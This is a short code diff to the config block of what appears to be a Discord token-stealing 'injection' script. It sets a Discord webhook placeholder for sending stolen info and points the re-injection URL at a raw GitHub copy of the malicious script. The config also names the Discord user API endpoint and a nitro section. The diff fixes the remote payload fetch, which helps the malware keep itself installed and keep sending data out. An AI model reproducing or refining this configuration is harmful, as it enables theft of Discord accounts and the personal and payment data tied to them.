@@ -16,7 +16,7 @@ const config = {
     ), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   webhook: "%WEBHOOK%", //your discord webhook there obviously
-  injection_url: "https://github.com/TWIST-X7/Injection/blob/main/Injection-clean.js", //injection url for when it reinjects
+  injection_url: "https://raw.githubusercontent.com/TWIST-X7/Injection/main/Injection-clean.js", //injection url for when it reinjects
   /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
   api: "https://discord.com/api/v9/users/@me",
   nitro: {
